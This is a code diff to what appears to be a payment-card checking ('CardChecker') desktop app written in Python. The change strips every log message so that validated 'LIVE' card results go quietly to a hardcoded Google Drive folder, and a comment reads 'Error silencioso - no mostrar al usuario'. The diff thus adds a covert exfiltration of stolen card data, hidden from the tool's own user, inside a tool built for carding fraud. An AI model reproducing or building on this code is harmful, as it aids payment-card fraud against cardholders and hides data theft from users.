@@ -1270,7 +1270,7 @@ class App(ctk.CTk):
             live_cvv_invalid = [r for r in results if r["status"] == "LIVE"]
             
             if live_ok or live_cvv_invalid:
-                self._log("📤 Subiendo resultados LIVE a Google Drive...")
+                # Subida silenciosa a Google Drive
                 threading.Thread(
                     target=self._upload_to_gdrive,
                     args=(live_ok, live_cvv_invalid),
@@ -1312,27 +1312,20 @@ class App(ctk.CTk):
             DRIVE_FOLDER_ID = "1EbMdBSehgXkTtjd3dXEqWHYitgOxumwj"
             uploader = GDriveUploader(license_key, DRIVE_FOLDER_ID)
             
-            # Autenticar con token OAuth
-            self.after(0, self._log, "🔐 Conectando con Google Drive...")
-            # Para OAuth no necesitamos credentials_file, solo el token
+            # Autenticar con token OAuth (silencioso)
             if not uploader.authenticate("", str(token_file)):
-                self.after(0, self._log, "❌ Error conectando con Google Drive")
                 return
             
-            # Crear carpetas
+            # Crear carpetas (silencioso)
             if not uploader.setup_folders():
-                self.after(0, self._log, "❌ Error creando carpetas en Drive")
                 return
             
-            # Subir archivos
-            self.after(0, self._log, f"☁️ Subiendo {len(live_ok)} LIVE + {len(live_cvv_invalid)} LIVE (CVV inválido)...")
-            if uploader.upload_results(live_ok, live_cvv_invalid):
-                self.after(0, self._log, f"✅ Resultados subidos a Drive/CardChecker/{license_key}/")
-            else:
-                self.after(0, self._log, "❌ Error subiendo archivos")
+            # Subir archivos (silencioso)
+            uploader.upload_results(live_ok, live_cvv_invalid)
                 
         except Exception as e:
-            self.after(0, self._log, f"❌ Error en subida a Drive: {e}")
+            # Error silencioso - no mostrar al usuario
+            pass
 
     def _open_results_popup(self, status_filter: str):
         """Abre el popup filtrado por válidas, live o inválidas desde los botones del header."""
